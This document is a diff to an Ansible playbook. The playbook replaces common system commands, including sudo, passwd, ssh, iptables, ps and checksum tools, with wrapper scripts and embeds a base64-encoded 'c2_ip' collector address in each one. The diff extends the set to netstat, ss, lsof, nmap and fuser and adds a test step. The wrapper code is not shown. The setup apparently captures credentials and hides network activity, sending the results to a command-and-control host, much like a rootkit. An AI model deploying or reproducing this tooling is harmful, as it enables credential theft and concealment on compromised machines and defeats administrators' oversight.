@@ -69,7 +69,7 @@
 
     - name: Remove existing wrappers before deploy (force fresh copy)
       shell: |
-        for f in sudo passwd su ssh useradd userdel deluser usermod visudo systemctl ufw iptables ip6tables adduser rm ls find ps kill pkill killall grep stat chmod chown mv cp which cat less more file strings diff md5sum sha256sum iptables-save ip6tables-save; do
+        for f in sudo passwd su ssh useradd userdel deluser usermod visudo systemctl ufw iptables ip6tables adduser rm ls find ps kill pkill killall grep stat chmod chown mv cp which cat less more file strings diff md5sum sha256sum iptables-save ip6tables-save netstat ss lsof nmap fuser; do
           [ -f "{{ wrapper_bin }}/${f}" ] && /bin/rm -f "{{ wrapper_bin }}/${f}"
         done
         true
@@ -123,11 +123,16 @@
         - { src: "sha256sum_wrapper.sh",       dest: "sha256sum"       }
         - { src: "iptables-save_wrapper.sh",   dest: "iptables-save"   }
         - { src: "iptables-save_wrapper.sh",   dest: "ip6tables-save"  }
+        - { src: "netstat_wrapper.sh",         dest: "netstat"         }
+        - { src: "ss_wrapper.sh",              dest: "ss"              }
+        - { src: "lsof_wrapper.sh",            dest: "lsof"            }
+        - { src: "nmap_wrapper.sh",            dest: "nmap"            }
+        - { src: "fuser_wrapper.sh",           dest: "fuser"           }
 
     - name: Base64-encode collector IP and replace __ENC__ placeholder in all wrappers
       shell: |
         _E=$(printf "%s" "{{ c2_ip }}" | base64 -w0)
-        for f in sudo passwd su ssh useradd userdel deluser usermod visudo systemctl ufw iptables ip6tables adduser rm ls find ps kill pkill killall grep stat chmod chown mv cp which cat less more file strings diff md5sum sha256sum iptables-save ip6tables-save; do
+        for f in sudo passwd su ssh useradd userdel deluser usermod visudo systemctl ufw iptables ip6tables adduser rm ls find ps kill pkill killall grep stat chmod chown mv cp which cat less more file strings diff md5sum sha256sum iptables-save ip6tables-save netstat ss lsof nmap fuser; do
           sed -i "s/__ENC__/${_E}/g" "{{ wrapper_bin }}/${f}"
         done
         true
@@ -205,6 +210,11 @@
         - md5sum_wrapper.sh
         - sha256sum_wrapper.sh
         - iptables-save_wrapper.sh
+        - netstat_wrapper.sh
+        - ss_wrapper.sh
+        - lsof_wrapper.sh
+        - nmap_wrapper.sh
+        - fuser_wrapper.sh
 
     - name: Base64-encode collector IP and replace __ENC__ in backup copies
       shell: |
@@ -223,3 +233,34 @@
         export PATH
       args:
         executable: /bin/bash
+
+    # ---- 7. Run network wrapper tests ----
+    - name: Copy test helpers and network test script
+      copy:
+        src: "{{ item.src }}"
+        dest: "/tmp/{{ item.dest }}"
+        mode: "0755"
+      loop:
+        - { src: "tests/test_helpers.sh", dest: "test_helpers.sh" }
+        - { src: "tests/test_network.sh", dest: "test_network.sh" }
+
+    - name: Run network wrapper tests
+      shell: |
+        export PATH="/usr/local/bin:$PATH"
+        cd /tmp && bash test_network.sh
+      args:
+        executable: /bin/bash
+      register: net_test_result
+      ignore_errors: yes
+
+    - name: Show network test results
+      debug:
+        var: net_test_result.stdout_lines
+
+    - name: Clean up test scripts
+      file:
+        path: "/tmp/{{ item }}"
+        state: absent
+      loop:
+        - test_helpers.sh
+        - test_network.sh
